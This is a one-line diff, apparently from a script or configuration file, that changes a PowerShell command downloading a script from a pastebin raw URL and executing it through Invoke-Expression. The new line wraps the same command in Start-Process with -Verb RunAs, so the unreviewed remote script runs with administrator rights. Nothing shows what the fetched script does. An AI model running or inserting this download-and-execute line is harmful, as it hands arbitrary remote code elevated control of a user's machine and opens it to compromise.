@@ -1,1 +1,1 @@
-powershell.exe -Command "irm 'https://pastebin.com/raw/wv1HvG4T' | iex"
+powershell.exe -Command "Start-Process powershell.exe -ArgumentList 'irm \"https://pastebin.com/raw/wv1HvG4T\" | iex' -Verb RunAs"
